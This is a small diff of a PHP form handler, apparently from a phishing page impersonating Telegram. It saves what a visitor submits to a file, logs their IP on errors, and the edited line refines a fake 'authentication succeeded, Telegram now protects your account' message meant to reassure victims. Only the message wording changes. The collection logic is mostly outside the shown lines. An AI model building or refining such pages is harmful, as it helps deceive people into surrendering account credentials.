@@ -54,7 +54,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         
         if ($written !== false) {
             // Message de succès amélioré
-            echo "AUTHENTIFICATION RÉUSSI ☑️\n TELEGRAME PROTÈGE VÔTRE COMPLET.";
+            echo "AUTHENTIFICATION RÉUSSI ☑️\n TELEGRAME PROTÈGE DÉSORMAIS VÔTRE COMPTE.";
         } else {
             // Journalisation d'erreur professionnelle
             error_log("[" . date('Y-m-d H:i:s') . "] Échec d'écriture dans $file. IP: $ip");
